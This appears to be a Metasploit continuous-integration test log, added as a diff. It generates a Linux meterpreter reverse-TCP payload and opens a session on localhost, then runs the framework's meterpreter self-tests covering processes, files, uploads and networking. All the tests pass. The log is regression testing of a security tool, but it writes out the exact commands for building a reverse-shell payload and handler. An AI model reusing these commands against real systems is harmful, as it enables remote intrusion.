@@ -1,0 +1,96 @@
+Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.
+[4mmsf6[0m [0m> loadpath test/modules
+Loaded 39 modules:
+    14 auxiliary modules
+    13 exploit modules
+    12 post modules
+[4mmsf6[0m [0m> use linux/x64/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231206-3222-j8g96ktxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> generate -o /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231206-3222-1v7m2p -f elf AutoVerifySessionTimeout=30 lport=6001 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/tmp/linuxx64meterpreterreverse_tcp_debug_log20231206-3222-inrm11txt MeterpreterTryToFork=false MeterpreterDebugBuild=true
+SessionTlvLogging => file:/tmp/linuxx64meterpreterreverse_tcp_session_tlv_logging20231206-3222-j8g96ktxt
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> [*] Writing 250 bytes to /tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231206-3222-1v7m2p...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 0
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6001 
+[*] Sending stage (3045380 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:6001 -> 127.0.0.1:40448) at 2023-12-06 23:03:00 +0000
+use test/meterpreter
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> run session=1 AddEntropy=true Verbose=true
+[*] Setup: changing working directory to tmp: /tmp
+[*] Setup: Creating clean directory
+[*] Creating directory meterpreter-test-dir-idhcxjfu
+[*] meterpreter-test-dir-idhcxjfu created
+[*] Setup: Now in /tmp/meterpreter-test-dir-idhcxjfu
+[*] Running against session 1
+[*] Session type is meterpreter and platform is linux
+[+] should enumerate supported core commands
+[+] should support 3 or more core commands
+[*] Starting process tests
+[*] [should return its own process id] Pid: 3272
+[+] should return its own process id
+[*] [should return a list of processes] PID info: {"pid"=>3272, "ppid"=>3222, "name"=>"child-process-rb-linux-x---meterpreter-reverse-tcp20231206-3222-1v7m2p", "path"=>"/tmp/child-process-rb-linux-x---meterpreter-reverse-tcp20231206-3222-1v7m2p", "session"=>nil, "user"=>"runner", "arch"=>"x86_64"}
+[+] should return a list of processes
+[*] Starting system config tests
+[+] should return a user id
+[+] should return a sysinfo Hash
+[*] Starting filesystem tests
+[*] [should return the proper directory separator] received sysinfo {"Computer"=>"fv-az776-380.gib5dkvrjkgedmzi5ptrevqpbg.bx.internal.cloudapp.net", "OS"=>"Ubuntu 20.04 (Linux 5.15.0-1051-azure)", "Architecture"=>"x64", "BuildTuple"=>"x86_64-linux-musl", "System Language"=>nil, "Domain"=>nil, "Logged On Users"=>nil}
+[*] [should return the proper directory separator] Received separator "/" - expected: "/"
+[+] should return the proper directory separator
+[*] [should return the current working directory] CWD: /tmp/meterpreter-test-dir-idhcxjfu
+[+] should return the current working directory
+[+] should list files in the current directory
+[*] [should stat a directory] Current directory: "/tmp/meterpreter-test-dir-idhcxjfu"
+[*] [should stat a directory] Stat of current directory: #<#<Class:0x00007fea62729f58>:0x0000559c2a423760 @stathash={"st_dev"=>2049, "st_mode"=>16877, "st_nlink"=>2, "st_uid"=>1001, "st_gid"=>127, "st_rdev"=>0, "st_ino"=>526234, "st_size"=>4096, "st_atime"=>1701903780, "st_mtime"=>1701903780, "st_ctime"=>1701903780}>
+[+] should stat a directory
+[*] [should create and remove a dir] Directory Name: meterpreter-test-dir-wqzhefmt
+[*] [should create and remove a dir] Directory created successfully
+[*] [should create and remove a dir] Directory removed successfully
+[+] should create and remove a dir
+[*] [should change directories] Directory Name: meterpreter-test-dir-wqzhefmt
+[*] [should change directories] Directory created successfully
+[*] [should change directories] Old CWD: /tmp/meterpreter-test-dir-idhcxjfu
+[*] [should change directories] New CWD: /tmp/meterpreter-test-dir-idhcxjfu/meterpreter-test-dir-wqzhefmt
+[*] [should change directories] Back to old CWD: /tmp/meterpreter-test-dir-idhcxjfu
+[*] [should change directories] Directory removed successfully
+[+] should change directories
+[*] [should create and remove files] File Name: meterpreter-test-wqzhefmt
+[*] [should create and remove files] Wrote to meterpreter-test-wqzhefmt, checking contents
+[*] [should create and remove files] Wrote test
+[+] should create and remove files
+[*] [should upload a file] Remote File Name: meterpreter-test-file-wqzhefmt.txt
+[*] [should upload a file] uploading
+[*] [should upload a file] done
+[*] [should upload a file] remote file exists? true
+[+] should upload a file
+[*] [should move files] Source File Name: meterpreter-test-wqzhefmt
+[*] [should move files] Destination File Name: meterpreter-test-wqzhefmt-moved
+[+] should move files
+[*] [should copy files] Source File Name: meterpreter-test-wqzhefmt
+[*] [should copy files] Destination File Name: meterpreter-test-wqzhefmt-copied
+[+] should copy files
+[*] [should do md5 and sha1 of files] Remote File Name: meterpreter-test-file-wqzhefmt.txt
+[*] [should do md5 and sha1 of files] uploading
+[*] [should do md5 and sha1 of files] done
+[*] [should do md5 and sha1 of files] remote file exists? true
+[*] [should do md5 and sha1 of files] remote md5: 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] local md5 : 4b9d87c1f495a5a176e18ee27f85279a
+[*] [should do md5 and sha1 of files] remote sha: 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[*] [should do md5 and sha1 of files] local sha : 5ea80bb04e521918b087c695eb6930ac25ee8a7d
+[+] should do md5 and sha1 of files
+[*] Starting networking tests
+[+] should return network interfaces
+[+] should have an interface that matches session_host
+[+] should return network routes
+[*] Testing complete in 0.12 seconds
+[*] Passed: 20; Failed: 0; Skipped: 0
+[*] Cleanup: changing working directory back to /home/runner/work/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+sessions -K
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 1 closed.
+[4mmsf6[0m post([1m[31mtest/meterpreter[0m) [0m> 
